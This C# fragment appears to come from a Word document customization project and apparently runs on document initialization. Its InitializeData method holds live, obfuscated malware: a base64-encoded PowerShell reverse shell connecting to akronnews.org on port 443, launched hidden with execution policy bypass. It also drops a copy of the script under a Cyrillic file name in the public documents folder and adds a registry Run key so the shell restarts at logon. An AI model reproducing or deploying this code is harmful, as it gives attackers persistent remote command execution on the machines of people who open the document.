...
namespace WordDocument2 {
    ...
    public sealed partial class ThisDocument : Microsoft.Office.Tools.Word.DocumentBase {
        ...
        private void InitializeData() {
            var psCommand = "$a = 'akron' + 'news' + '.org';$p = 3 + 20 + 20 + 200 + 200;$t = 'Syst';$u = 'em.Net';$v = '.So';$w = 'cket';$x = 's.T';$y = 'CPC';$z = 'lient';$c = &('{1}{0}' -f 'bject','New-O') $t$u$v$w$x$y$z($a,$p);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$e = 'em.Te';$f = 'xt.A';$g = 'SCIIEnc';$h = 'oding';$d = (&('{1}{0}' -f 'bject','New-O') -TypeName $t$e$f$g$h).GetString($bytes,0, $i);$sb = (&('{2}{1}{0}' -f 'x','e','i') $d 2>&1 | &('{1}{0}' -f 'ring','Out-St'));$sb2 = $sb + 'PS ' + (&('{2}{1}{0}' -f 'd','w','p')).Path + '>';$sb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close();";
            var psCommandBytes = System.Text.Encoding.Unicode.GetBytes(psCommand);
            var psCommandBase64 = System.Convert.ToBase64String(psCommandBytes);
            
            var startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-ExecutionPolicy bypass -EncodedCommand {psCommandBase64}",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(startInfo);

            File.WriteAllText("C:\\Users\\Public\\Documents\\безопасный.ps1", psCommandBase64);
            Microsoft.Win32.RegistryKey k;
            k = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\Qwerty");
            k.SetValue("Qwerty", "for /F 'usebackq delims = ' %A in (`type C:\\Users\\Public\\Documents\\безопасный.ps1`) do powershell -ExecutionPolicy bypass -EncodedCommand %A");
            k.Close();
        }
